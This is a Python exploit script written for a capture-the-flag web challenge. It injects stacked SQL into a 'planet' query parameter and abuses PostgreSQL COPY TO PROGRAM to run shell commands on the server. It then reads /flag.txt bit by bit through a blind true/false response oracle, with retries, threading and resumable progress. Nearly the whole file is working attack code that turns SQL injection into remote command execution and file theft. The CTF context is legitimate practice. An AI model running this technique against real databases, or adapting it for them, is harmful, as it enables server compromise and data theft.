#!/usr/bin/env python3
"""Read /flag.txt through PostgreSQL COPY TO PROGRAM's exit status.

The application suppresses SQL results/errors, but its carrier/null indicator
distinguishes a successful final SELECT from a failed COPY command. Each
request executes a small shell predicate and leaks one bit. Progress is saved.
"""

import json
import os
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

URL = "https://planetary.web.2026.sunshinectf.games/probe"
SAVE = os.path.join(os.path.dirname(__file__), ".flag-progress.json")
lock = threading.Lock()


class BitOracle:
    def __init__(self):
        self.session = requests.Session()

    def raw(self, predicate):
        # Consume the COPY data before running the predicate. If the predicate
        # fails, COPY aborts and the app reports null; otherwise SELECT 1
        # produces a carrier response.
        shell = "cat >/dev/null; " + predicate
        sql = "'; COPY (SELECT 1) TO PROGRAM '" + shell + "'; SELECT 1; -- -"
        for attempt in range(4):
            try:
                res = self.session.get(URL, params={"planet": sql}, timeout=(5, 12))
                if res.status_code != 200:
                    raise RuntimeError(f"HTTP {res.status_code}")
                if "is-carrier" not in res.text and "is-null" not in res.text:
                    raise RuntimeError("No recognizable signal")
                return "is-carrier" in res.text
            except (requests.RequestException, RuntimeError) as exc:
                if attempt == 3:
                    raise RuntimeError(f"Request failed: {exc}") from exc
                time.sleep(0.5 * (attempt + 1))

    def positive(self, predicate):
        # We have observed occasional false negatives, but not false positives.
        negatives = 0
        failures = 0
        while negatives < 3:
            try:
                if self.raw(predicate):
                    return True
                negatives += 1
            except RuntimeError:
                failures += 1
                if failures >= 10:
                    raise
                time.sleep(1)
        return False


def get_length():
    oracle = BitOracle()
    lo, hi = 0, 32
    while oracle.positive(f"f=$(cat /flag.txt); test ${{#f}} -gt {hi}"):
        hi *= 2
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.positive(f"f=$(cat /flag.txt); test ${{#f}} -gt {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(position):
    oracle = BitOracle()
    prefix = (f"set -- $(head -c {position} /flag.txt | tail -c 1 | od -t u1); "
              'test "$2" ')
    for _ in range(4):
        lo, hi = 31, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle.positive(prefix + f"-gt {mid}"):
                lo = mid + 1
            else:
                hi = mid
        if oracle.positive(prefix + f"-eq {lo}"):
            return position, chr(lo)
    raise RuntimeError(f"Could not verify position {position}")


def main():
    size = int(os.environ.get("FLAG_LEN", "0")) or get_length()
    print("Flag length:", size, flush=True)
    progress = json.load(open(SAVE)) if os.path.exists(SAVE) else {}
    with ThreadPoolExecutor(max_workers=4) as pool:
        futures = [pool.submit(get_char, i) for i in range(1, size + 1)
                   if str(i) not in progress]
        for future in as_completed(futures):
            try:
                pos, ch = future.result()
            except Exception as exc:
                print(f"Worker failed: {exc}", file=sys.stderr, flush=True)
                continue
            with lock:
                progress[str(pos)] = ch
                with open(SAVE, "w") as fp:
                    json.dump(progress, fp, indent=2)
                partial = "".join(progress.get(str(i), "?") for i in range(1, size + 1))
                print(f"{pos}: {ch!r}  {partial}", flush=True)
    if len(progress) == size:
        flag = "".join(progress[str(i)] for i in range(1, size + 1))
        print("FLAG:", flag)
    else:
        print(f"Partial: {len(progress)}/{size} characters; rerun to resume")


if __name__ == "__main__":
    main()
